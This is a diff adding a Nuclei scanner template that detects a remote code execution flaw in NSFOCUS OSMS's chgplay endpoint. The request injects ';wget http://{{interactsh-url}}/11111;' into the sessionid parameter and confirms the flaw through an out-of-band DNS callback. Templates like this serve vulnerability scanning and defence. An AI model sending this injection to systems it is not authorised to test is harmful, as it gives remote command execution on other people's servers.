@@ -1,0 +1,27 @@
+id: nsfocus-osms-chgplay-rce
+info:
+  name: NSFOCUS OSMS chgplay Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dnslog
+
+http:
+  - raw:
+      - |
+        GET /webconf/log/chgplay?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&status=charset&speed=10&sessionid=;wget%20http://{{interactsh-url}}/11111; HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Server: NSFOCUS"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
